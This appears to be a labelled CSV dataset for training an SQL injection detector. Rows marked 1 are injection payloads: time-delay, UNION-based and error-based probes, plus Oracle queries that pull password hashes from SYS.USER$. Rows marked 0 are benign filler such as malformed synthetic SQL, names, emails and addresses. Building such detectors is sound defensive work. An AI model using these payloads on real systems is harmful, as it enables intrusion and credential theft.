Sentence,Label
"1%"" )  and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
2239350000000000,0
SELECT * FROM whale  WHERE industrial NOT LIKE '[nearby]%',0
"-8060"" )  where 5290 = 5290 or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",1
25514,0
"1 )  or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and  ( 3294 = 3294",1
SELECT apple ( s )  FROM settlers SELECT north ( s ) ,0
"-5379' )  union all select 4294,4294,4294--",1
boys@muebetuweb.mu,0
lcar,0
izzi barnils,0
"1""  )  )   as aamh where 7432 = 7432  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users ) --",1
llorador,0
carson,0
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_status_3021' LIMIT 1,0
rolleck@soybueno.mm,0
1   )    )    as qgma where 7675  =  7675 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
SELECT * FROM  ( SELECT western FROM plant ) ,0
SELECT * FROM flat WHERE drop BETWEEN pale09/01/1996weigh AND began15/31/1996known,0
chaiman,0
3u*3m15i92,0
SELECT TOP 50 PERCENT * FROM eventually,0
"INSERT INTO desk ( hidden, atomic, lift, subject, noon, second )  VALUES  ( 'fed', 'badly'. sure', 'word', 'alive', 'first', 'yesterday' )  ",0
"-2912""  )   as eizh where 2223  =  2223 or make_set  (  1041  =  3056,3056  )  --",1
82474321r,0
65223156d,0
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1
lehar,0
" While course Scottish tradition , given touch Swabian colour Kaltenhof event grounds ",0
" You almost think see folds old man &apos;s neck , young fisherman Manolo speaks ",0
"1'+  (  select llcl where 8188  =  8188 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
carmia,0
-7600' or 7684  =  3181#,1
"1  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1
1'  )  )   and sleep ( 5 )  and   (  (  'jiio' like 'jiio,1
SELECT * FROM hold WHERE pass BETWEEN '1996-07-01' AND '1996-07-31',0
romano,0
" select * from users where id = 1 or ""$?"" or 1 = 1 -- 1",1
09275,0
marcelo,0
1'  )  )   and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and   (  (  'wevl' = 'wevl,1
"c/ blanquers 13, 9-b",0
"iif ( 1149 = 4765,1,1/0 ) ",1
"1%"" order by 1#",1
"   SELECT music, noun, where FROM she WHERE rather  IS NULL",0
eliseo,0
ribot velugo,0
batllori budi,0
SELECT face FROM captured UNION SELECT environment FROM night ORDER BY frequently,0
1  )   where 9446  =  9446 union all select null#,1
"1%"" or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and ""%"" = """,1
"1""   )    )     )   union all select null,null,null,null,null--",1
SELECT shop ( s )  FROM front UNION,0
"1'+  (  select 'nzgq' where 7230  =  7230 and elt  (  1210  =  1210,sleep  (  5   )    )     )  +'",1
end and    (    (   'zlsq'  =  'zlsq,1
"1"" ) ",1
"1' and elt ( 1210 = 1210,sleep ( 5  )  )   and 'ioar' = 'ioar",1
marcanti,0
SELECT TOP 3 * FROM actual SELECT * FROM moving 3SELECT * FROM plate,0
-8051 )  or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and  ( 5637 = 5637,1
cont5975614s74,0
5426744631176158,0
select sleep ( 5 )  and   (  (  3404 = 3404,1
1 )  and 2006 = 2006,1
"1"" )  or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and  ( ""njdu"" like ""njdu",1
4381135407580429,0
moldero,0
select * from users where id  =  1 <@.$ or 1  =  1 -- 1,1
SELECT * FROM smile WHERE finally = 'generally'  OR engineer = 'adventure',0
06670,0
7771884953425478,0
"   SELECT CustomerName, ContactName, AddressFROM CustomersWHERE Address   IS NULL;",0
SELECT * FROM welcome WHERE NOT eat = 'family'  AND NOT prove = 'explanation',0
"   SELECT choice, corn, struck FROM major WHERE machine  IS NULL",0
 ( select * from  ( select ( sleep ( 5  )  )   ) srmq ) #,1
calle laujar 42,0
"1' where 1893 = 1893 and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
sirevici,0
"1' or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and 'rhzy' = 'rhzy",1
"camino san jaime 97,",0
-1468'  )  )   )  or 4875 = 6163#,1
3625,0
"-3626%""  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""%""  =  """,1
"1'   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'txwf'  =  'txwf",1
"1'  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'adjc'  =  'adjc",1
 John Kerry says US spying &quot; reached far inappropriately &quot; unprecedented admission John Kerry indicated softening U,0
8652159260069074,0
"  SELECT asleep,hat FROM vast WHERE typical = 'his' UNION SELECT using, whenever FROM meal",0
me9ieval,0
muskiz,0
 Many Wall Street view addition baggage fees sign airlines charging enough money cover cost air travel years losses ,0
"1%""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""%""  =  """,1
" SELECT * FROM missing ORDER BY string, along",0
"1' in boolean mode )  and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) #",1
carrizales oate,0
SELECT joy ( s )  FROM willing FULL OUTER JOIN,0
1' where 1557  =  1557,1
" There &apos;s also money walk-in clinics Hobart Launceston , better after-hospital care , medical specialist training , mental health services rollout personal electronic health record systems local hospitals ",0
"1""  )   union all select null,null,null,null,null,null,null,null--",1
1 and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) -- izad,1
haddon@hiperbarcelona.tl,0
1' )  as sruz where 6318 = 6318,1
"   SELECT anybody, rough+ ', ' + wide+ ' ' + laid+ ', ' + folks AS yet  FROM clay",0
2523504851273429,0
exte69a1i29,0
croiseti,0
brightwe,0
lopez castrillon 162,0
"1"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"-6523"" or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and ""bwrb"" like ""bwrb",1
select * from users where id  =  1 +  (  \  )   or 1  =  1 -- 1,1
gruart ola,0
"1"" )  as rovd where 3764 = 3764 and elt ( 4249 = 4249,7259 ) --",1
"1' where 2774 = 2774 union all select null,null,null,null,null#",1
DELETE FROM thou WHERE needs = 'force',0
"1   )    )    as jzzo where 7773  =  7773 union all select null,null,null,null,null#",1
"  SELECT * FROM higher WHERE available NOT IN  ( 'work', 'turn', 'plan' )  ",0
23280,0
3362439041972349,0
"select * from generate_series ( 9863,9863,case when  ( 9863 = 3285 )  then 1 else 0 end )  limit 1--",1
"1%' and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and '%' = '",1
85804612f,0
"1""  )  )   )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( ""bizm"" = ""bizm",1
"1%'   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
fauno,0
16094499l,0
"1' or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and 'aezm' like 'aezm",1
"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1
DELETE FROM interest,0
"   SELECT moon, wave, behaviorFROM religious WHERE table  IS NOT NULL",0
"1'  )   union all select null,null,null,null,null,null,null,null,null,null#",1
" &quot; We would welcome review CASA allowing use electronic devices really think improve customer experience (wireless in-flight entertainment) planes , &quot; spokesman said ",0
aventajada,0
3972,0
SELECT * FROM congress 3 SELECT * FROM page,0
1'  )  )   )  and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #,1
SELECT tears FROM gain,0
"1%'  )  )   or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (  '%' = '",1
"1' in boolean mode  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
-6165%'   )    )    union all select 5384#,1
03390,0
SELECT TOP 3 * FROM easily WHERE unless = 'percent',0
-7041'  )   where 6307  =  6307 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1
maridel,0
SELECT sun ( s )  FROM direction FULL OUTER JOIN,0
 California planners looking system devise strategies meet goals laid state &apos;s ambitious global warming laws ,0
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1
"1'   )    )     )   and make_set  (  6094  =  2929,2929  )   and    (    (     (  'gkyo'  =  'gkyo",1
"calle vicente seixo 182,",0
 (  select   (  case when   (  1570  =  6977  )   then 1 else 1570*  (  select 1570 from mysql.db  )   end   )    ) ,1
SELECT * FROM have WHERE Price NOT BETWEEN 10 AND 20,0
"-7511  )  )   as xqzf where 9939 = 9939 union all select 9939,9939,9939,9939,9939,9939,9939--",1
3119850000000000,0
"-9237'  )   union all select 7454,7454,7454,7454,7454,7454,7454,7454,7454--",1
"1%' )  or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
1  )   as afxc where 7497  =  7497,1
select   (  case when   (  7852  =  7476  )   then 7852 else 7852*  (  select 7852 from mysql.db  )   end  )  #,1
SELECT AVG ( decide ) FROM recently SELECT SUM ( classroom ) ,0
"  SELECT Orders.breadrID, Employees.mountain, Employees.compass FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.societyID ORDER BY Orders.vaporID",0
"-8651"" )  where 8391 = 8391 union all select 8391,8391#",1
zouheir,0
mira boncompte,0
SELECT shinning ( s )  FROM upward UNION ALL,0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'cwuy'  =  'cwuy",1
 The Aachen resident suffered serious injuries taken hospital treatment ,0
rosita,0
"1' where 3339  =  3339 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1
13061311w,0
SELECT TOP 50 PERCENT * FROM definition SELECT * FROM practice FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM cook,0
"calle pea 49, 9?b",0
31243,0
desempulgadura,0
bernette2,0
werling,0
33437614f,0
8790895171234504,0
SELECT COUNT ( rapidly ) FROM together,0
"-6870""  )   as deox where 8198  =  8198 union all select 8198#",1
conocchiari zagal,0
19244,0
" SELECT * FROM refused ORDER BY function ASC, stiff DESC",0
47319,0
1' )  where 8204 = 8204,1
"1' )  where 8211 = 8211 union all select null,null,null,null,null#",1
SELECT AVG ( clear )  FROM problem  SELECT SUM ( plane ) ,0
"calle francisco gervas, 174, 9h",0
1 )  as uhmm where 2304 = 2304 union all select null#,1
junquera,0
eli,0
hi or a  =  a,1
feodora8,0
4.46813E+015,0
49540,0
 So scoop costs around £ 140 ,0
"  SELECT boardID AS ID, advice AS quite FROM automobile",0
SELECT * FROM pink WHERE having NOT BETWEEN 'nervous' AND 'maybe',0
sisebuto,0
"1%' or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and '%' = '",1
DELETE FROM fine WHERE moon = 'reason',0
SELECT * FROM success WHERE former = 'easier'  OR citizen = 'usually',0
 Registration open hours prior beginning competition ,0
creyente,0
" People saying &quot; gold price looks good , let &apos;s pawn grandma &apos;s gold chain get back next month ",0
"   SELECT grade, letter, caveFROM being WHERE arrange  IS NOT NULL",0
20500,0
SELECT TOP 50 PERCENT * FROM door SELECT * FROM poetry FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM circle,0
cla20te,0
SELECT * FROM poet 3 SELECT * FROM yourself,0
pryor,0
fabrizzio,0
SELECT shot ( s )  FROM height SELECT noun FROM zero,0
98011650w,0
"INSERT INTO north ( living, surface, author, desk, straw, sit )  VALUES  ( 'fuel', 'strip'. which', 'trick', 'instrument', 'weigh', 'inch' )  ",0
SELECT COUNT ( divide )  FROM instrument,0
paisaje,0
uncastillo,0
"1""   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""zptu""  =  ""zptu",1
SELECT AVG ( everything )  FROM prove  SELECT SUM ( glad ) ,0
pettitt,0
"-3037""   )    )     )   or elt  (  4758  =  9129,9129  )   and    (    (     (  ""zewv"" like ""zewv",1
"-5810 union all select 6307,6307,6307,6307,6307,6307,6307--",1
grinnage@programagestionerp.kn,0
hoeflich@movil-google.cx,0
"1"" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""bkoq""  =  ""bkoq",1
" Then, again, tell me, good man to-day, obligation put poor men good situations",0
decacque,0
chen-che,0
5975278199435199,0
1   )    )    as sfan where 7176  =  7176 and 7017  =  7358,1
SELECT * FROM customs FETCH FIRST 3 ROWS ONLY,0
1'+ ( select gkve where 1943 = 1943 waitfor delay '0:0:5' ) +',1
15 p,0
3582076186939679,0
SELECT * FROM create  WHERE heading = send,0
lagunaseca,0
17621392b,0
1'||  (  select 'yucg' where 2576  =  2576 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual   )    )   ||',1
28815,0
-9644   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   5616  =  5616,1
"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'swke'  =  'swke",1
oshea_knowles@tiaherminia.gh,0
SELECT COUNT ( DISTINCT recent )  FROM mysterious,0
ermina,0
31594,0
"   SELECT swept, day, chain FROM nothing WHERE happily  IS NULL",0
"   SELECT clear,carbon,bottle,ranch,research     (  (  scared JOIN clearly ON vertical.mass =  president.valley )   INNER JOIN brokenON Orders.copper =  vertical.arrowID ) ",0
 A three-bedroom house district Hof catches fire night ,0
22134277c,0
urrotz,0
us0j6,0
SELECT * FROM divide WHERE NOT beyond = 'invented'  AND NOT handle = 'fellow',0
"1%""  )   union all select null,null,null,null,null--",1
"reinosa 98, 13-e",0
44213,0
"-7971  )  )   as armw where 9474 = 9474 or make_set ( 9354 = 9354,7185 ) --",1
"1"" where 1051  =  1051 union all select null--",1
9947210285103354,0
26540,0
098oro4a4,0
SELECT printed ( s )  FROM verb FULL OUTER JOIN,0
" end and  ( ""qkkn"" like ""qkkn",1
 respectively ,0
23456317c,0
escritor lopez de cardenas 76 12e,0
"1"" )  as yekp where 3049 = 3049 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
 Yet discontent multitude formidable senate college,0
8084984128679341,0
' or username is not NULL or username  =  ',1
"1' )  and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and  ( 'mseo' like 'mseo",1
kaz@3horas.com,0
859,0
gancedo,0
99999464h,0
" select * from users where id = 1 or ""%_"" or 1 = 1 -- 1",1
"1'  )  )   )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (   ( 'crus' = 'crus",1
"1%"" )  or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and  ( ""%"" = """,1
SELECT * FROM spite WHERE standard BETWEEN 'base' AND 'solve',0
1' )  as sagj where 4558 = 4558,1
"1"" or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and ""kojr"" = ""kojr",1
lahnstein agundis,0
94505880f,0
llombai,0
SELECT * FROM  ( SELECT particles FROM mission ) ,0
 The appeals court said judge needed removed case ran afoul code conduct U,0
-9197'  )   or   (  6877  =  8010  )  *8010 and   (  'umwl'  =  'umwl,1
1  )   where 1013  =  1013 and 5573  =  9445#,1
3192910000000000,0
SELECT * FROM shut WHERE larger NOT LIKE 'full%',0
wostrikoff@hojainformativas.gi,0
colls messegu,0
 ( select * from  ( select ( sleep ( 5  )  )   ) srmq )  and  ( '%' = ',1
SELECT * FROM president,0
aminta,0
-6215' )  or  ( 8459 = 8459 ) *4906,1
"-7433""  )  )   as zsnt where 2513 = 2513 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --",1
19332,0
viataiano,0
